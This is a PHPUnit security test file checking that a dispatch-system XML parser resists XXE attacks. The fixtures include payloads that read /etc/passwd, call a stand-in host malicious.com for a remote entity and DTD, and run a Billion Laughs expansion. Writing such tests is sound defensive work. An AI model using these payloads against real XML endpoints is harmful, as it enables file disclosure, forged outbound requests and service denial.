<?php

declare(strict_types=1);

namespace NwsCad\Tests\Security;

use NwsCad\AegisXmlParser;
use PHPUnit\Framework\TestCase;

/**
 * Security tests for XXE (XML External Entity) prevention
 * Tests that XML parser properly prevents XXE attacks
 */
class XxeTest extends TestCase
{
    private string $tempDir;

    protected function setUp(): void
    {
        parent::setUp();
        $this->tempDir = sys_get_temp_dir() . '/xxe_tests_' . uniqid();
        mkdir($this->tempDir, 0755, true);
    }

    protected function tearDown(): void
    {
        parent::tearDown();
        
        // Clean up temp files
        if (is_dir($this->tempDir)) {
            $files = glob($this->tempDir . '/*');
            foreach ($files as $file) {
                if (is_file($file)) {
                    unlink($file);
                }
            }
            rmdir($this->tempDir);
        }
    }

    public function testLibxmlNonetOptionDisablesExternalEntities(): void
    {
        // Create a minimal XML file
        $xmlPath = $this->tempDir . '/test.xml';
        file_put_contents($xmlPath, '<?xml version="1.0"?><root><value>test</value></root>');
        
        // In PHP 8.0+, external entity loading is disabled by default
        // Use LIBXML_NONET to prevent network access during XML parsing
        libxml_use_internal_errors(true);
        $xml = simplexml_load_file($xmlPath, 'SimpleXMLElement', LIBXML_NONET);
        $this->assertNotFalse($xml);
        libxml_clear_errors();
    }

    public function testXxeAttackWithFileSystem(): void
    {
        if (!getenv('MYSQL_HOST')) {
            $this->markTestSkipped('Database not configured for testing');
        }

        // Create malicious XML with external entity pointing to file system
        $xxeXml = <<<XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<CallExport xmlns="http://www.newworldsystems.com/Aegis/CAD/Peripheral/CallExport/2011/02">
    <CallId>&xxe;</CallId>
    <CallNumber>XXE-TEST</CallNumber>
    <CreateDateTime>2024-01-01T10:00:00</CreateDateTime>
    <ClosedFlag>false</ClosedFlag>
    <CanceledFlag>false</CanceledFlag>
</CallExport>
XML;
        
        $xmlPath = $this->tempDir . '/xxe_file.xml';
        file_put_contents($xmlPath, $xxeXml);
        
        try {
            cleanTestDatabase();
            $parser = new AegisXmlParser();
            $result = $parser->processFile($xmlPath);
            
            // Parser should handle this safely (either fail or not expand entity)
            $this->assertIsBool($result);
        } catch (\Exception $e) {
            // Exception is acceptable for malicious input
            $this->assertTrue(true, 'Parser correctly rejected malicious XML');
        }
    }

    public function testXxeAttackWithRemoteUrl(): void
    {
        if (!getenv('MYSQL_HOST')) {
            $this->markTestSkipped('Database not configured for testing');
        }

        // Create malicious XML with external entity pointing to remote URL
        $xxeXml = <<<XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://malicious.com/xxe">
]>
<CallExport xmlns="http://www.newworldsystems.com/Aegis/CAD/Peripheral/CallExport/2011/02">
    <CallId>&xxe;</CallId>
    <CallNumber>XXE-REMOTE</CallNumber>
    <CreateDateTime>2024-01-01T10:00:00</CreateDateTime>
    <ClosedFlag>false</ClosedFlag>
    <CanceledFlag>false</CanceledFlag>
</CallExport>
XML;
        
        $xmlPath = $this->tempDir . '/xxe_remote.xml';
        file_put_contents($xmlPath, $xxeXml);
        
        try {
            cleanTestDatabase();
            $parser = new AegisXmlParser();
            $result = $parser->processFile($xmlPath);
            
            // Should not make remote request
            $this->assertIsBool($result);
        } catch (\Exception $e) {
            $this->assertTrue(true, 'Parser correctly rejected malicious XML');
        }
    }

    public function testXxeAttackWithParameterEntity(): void
    {
        if (!getenv('MYSQL_HOST')) {
            $this->markTestSkipped('Database not configured for testing');
        }

        // Parameter entity attack
        $xxeXml = <<<XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "file:///etc/passwd">
    <!ENTITY % dtd SYSTEM "http://malicious.com/evil.dtd">
    %dtd;
]>
<CallExport xmlns="http://www.newworldsystems.com/Aegis/CAD/Peripheral/CallExport/2011/02">
    <CallId>12345</CallId>
    <CallNumber>XXE-PARAM</CallNumber>
    <CreateDateTime>2024-01-01T10:00:00</CreateDateTime>
    <ClosedFlag>false</ClosedFlag>
    <CanceledFlag>false</CanceledFlag>
</CallExport>
XML;
        
        $xmlPath = $this->tempDir . '/xxe_param.xml';
        file_put_contents($xmlPath, $xxeXml);
        
        try {
            cleanTestDatabase();
            $parser = new AegisXmlParser();
            $result = $parser->processFile($xmlPath);
            
            $this->assertIsBool($result);
        } catch (\Exception $e) {
            $this->assertTrue(true, 'Parser correctly rejected malicious XML');
        }
    }

    public function testBillionLaughsAttack(): void
    {
        if (!getenv('MYSQL_HOST')) {
            $this->markTestSkipped('Database not configured for testing');
        }

        // Billion Laughs (exponential entity expansion) attack
        $xxeXml = <<<XML
<?xml version="1.0"?>
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<CallExport xmlns="http://www.newworldsystems.com/Aegis/CAD/Peripheral/CallExport/2011/02">
    <CallId>12345</CallId>
    <CallNumber>&lol3;</CallNumber>
    <CreateDateTime>2024-01-01T10:00:00</CreateDateTime>
    <ClosedFlag>false</ClosedFlag>
    <CanceledFlag>false</CanceledFlag>
</CallExport>
XML;
        
        $xmlPath = $this->tempDir . '/xxe_billion_laughs.xml';
        file_put_contents($xmlPath, $xxeXml);
        
        try {
            cleanTestDatabase();
            $parser = new AegisXmlParser();
            
            // Set a timeout to prevent infinite loops
            set_time_limit(5);
            $result = $parser->processFile($xmlPath);
            
            $this->assertIsBool($result);
        } catch (\Exception $e) {
            $this->assertTrue(true, 'Parser correctly handled entity expansion attack');
        }
    }

    public function testValidXmlWithoutEntitiesProcessesCorrectly(): void
    {
        if (!getenv('MYSQL_HOST')) {
            $this->markTestSkipped('Database not configured for testing');
        }

        // Valid XML without external entities
        $validXml = <<<XML
<?xml version="1.0" encoding="UTF-8"?>
<CallExport xmlns="http://www.newworldsystems.com/Aegis/CAD/Peripheral/CallExport/2011/02">
    <CallId>12345</CallId>
    <CallNumber>VALID-001</CallNumber>
    <CallSource>911</CallSource>
    <CallerName>John Doe</CallerName>
    <NatureOfCall>Medical Emergency</NatureOfCall>
    <CreateDateTime>2024-01-01T10:00:00</CreateDateTime>
    <ClosedFlag>false</ClosedFlag>
    <CanceledFlag>false</CanceledFlag>
</CallExport>
XML;
        
        $xmlPath = $this->tempDir . '/valid.xml';
        file_put_contents($xmlPath, $validXml);
        
        try {
            cleanTestDatabase();
            $parser = new AegisXmlParser();
            $result = $parser->processFile($xmlPath);
            
            // Valid XML should process successfully or be skipped if already processed
            $this->assertIsBool($result);
        } catch (\Exception $e) {
            $this->fail('Valid XML should not throw exception: ' . $e->getMessage());
        }
    }

    public function testXmlWithCdataProcessesSafely(): void
    {
        // XML with CDATA (should be safe)
        $cdataXml = <<<XML
<?xml version="1.0" encoding="UTF-8"?>
<CallExport xmlns="http://www.newworldsystems.com/Aegis/CAD/Peripheral/CallExport/2011/02">
    <CallId>12345</CallId>
    <CallNumber>CDATA-001</CallNumber>
    <NatureOfCall><![CDATA[<script>alert('test')</script>]]></NatureOfCall>
    <CreateDateTime>2024-01-01T10:00:00</CreateDateTime>
    <ClosedFlag>false</ClosedFlag>
    <CanceledFlag>false</CanceledFlag>
</CallExport>
XML;
        
        $xmlPath = $this->tempDir . '/cdata.xml';
        file_put_contents($xmlPath, $cdataXml);
        
        // CDATA should be treated as text content, not executed
        // In PHP 8.0+, use LIBXML_NONET for security instead of deprecated libxml_disable_entity_loader
        libxml_use_internal_errors(true);
        
        $xml = simplexml_load_file($xmlPath, 'SimpleXMLElement', LIBXML_NONET);
        $this->assertNotFalse($xml);
        
        // CDATA content should be preserved as text
        $nature = (string)$xml->NatureOfCall;
        $this->assertEquals("<script>alert('test')</script>", $nature);
        
        libxml_clear_errors();
    }

    public function testLibxmlOptionsAreSecure(): void
    {
        // Test that proper LIBXML options are used
        $xmlPath = $this->tempDir . '/secure.xml';
        file_put_contents($xmlPath, '<?xml version="1.0"?><root><value>test</value></root>');
        
        libxml_use_internal_errors(true);
        
        // These are the secure options that should be used
        $secureOptions = LIBXML_NONET; // Disable network access
        
        $xml = simplexml_load_file($xmlPath, 'SimpleXMLElement', $secureOptions);
        
        $this->assertNotFalse($xml);
    }
}
